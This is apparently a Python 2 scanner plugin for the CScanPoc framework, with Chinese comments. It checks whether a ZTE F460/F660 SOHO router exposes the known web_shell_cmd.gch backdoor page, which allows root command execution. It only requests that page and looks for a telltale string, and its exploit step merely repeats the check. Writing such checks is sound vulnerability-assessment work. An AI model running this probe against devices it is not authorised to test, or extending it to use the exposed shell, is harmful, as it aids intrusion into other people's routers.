# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'ZTE_0000'  # 平台漏洞编号，留空
    name = 'ZTE SOHO ROUTERWEB_SHELL_CMD.GCH 远程命令执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-01-30'  # 漏洞公布时间
    desc = '''
        2014 年 3 月 3 日，Rapid7 团队发布了中兴 F460 / F660 后门信息[1]，任何可以访问设备的用户都可以直接访问一个命令执行的 Web 界面，并以 root 权限执行任意命令。
    '''  # 漏洞描述
    ref = 'http://blog.knownsec.com/2015/01/analysis-of-zte-soho-routerweb_shell_cmd-gch-remote-command-execution/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZTE'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ba369e72-2bd2-4151-9963-12ad9711a0e3'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/web_shell_cmd.gch"
            code, head, res, errcode, _ = hh.http(arg + payload)

            if code == 200 and 'please input shell command' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
